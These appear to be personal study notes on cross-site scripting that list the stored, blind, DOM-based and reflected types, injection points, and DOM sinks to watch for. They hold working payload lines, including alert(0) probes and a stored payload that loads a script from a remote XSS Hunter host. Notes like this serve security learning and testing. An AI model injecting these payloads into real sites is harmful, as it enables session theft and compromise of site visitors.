# XSS (Java Script Injection):
https://www.youtube.com/watch?v=nTCDQ0UmFgE&list=TLPQMDcxMDIwMjHs2PI_2WmObA&index=10
1. Stored XSS: XSS payload is sent to the database and is called everytime a page is loaded. an easy example would be using a comment field to input your script on a forum. 
2. Blind XSS: XSS payload is stored but loads on a page you cannot see. an example might be the XSS beign stored on a moderator/admins conntrol panel. 
3. DOM based XSS: vulnerable webpages that can be manipulated to give data they shouldn't. an example would be editing the document.location to return an XSS on a webpage. https://portswigger.net/web-security/cross-site-scripting/dom-based
4. Reflected XSS: the XSS isn't stored, the output is reflected to another page for viewing. an example is a malicious link which is sent to a victim from the attacker or a form input that uses our input in the next page. 

### places to attack with xss:
1. forms
2. url
3. http headers

# Build payloads:
1. https://portswigger.net/web-security/cross-site-scripting/cheat-sheet



## things to look for in use:
```
document.location 
window.location.search
```

## Examples: 
### Stored:
```
"> <script>alert(0)</script>
"><script src=https://insider.xss.ht></script>
```
### URL:
```
?%27><script>alert(0)</script>
```



XSS hunter:  https://insider.xss.ht



